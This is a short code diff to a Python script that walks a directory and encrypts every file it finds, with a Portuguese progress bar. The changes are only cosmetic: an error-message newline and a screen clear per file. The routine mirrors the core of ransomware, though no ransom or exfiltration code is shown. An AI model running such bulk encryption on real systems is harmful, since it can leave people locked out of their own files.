@@ -24,7 +24,7 @@ def encrypt_file(file_path, key):
         return encrypted_file_path
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"\nError: {e}")
         return
 
 def scan_and_encrypt(directory, key):
@@ -36,5 +36,6 @@ def scan_and_encrypt(directory, key):
                 files_to_encrypt.append(os.path.join(root, file))   
 
     for file_path in tqdm(files_to_encrypt, desc="Criptografando arquivos", unit="arquivo"):
+        os.system('cls' if os.name == 'nt' else 'clear')
         encrypt_file(file_path, key)
         time.sleep(0.1)
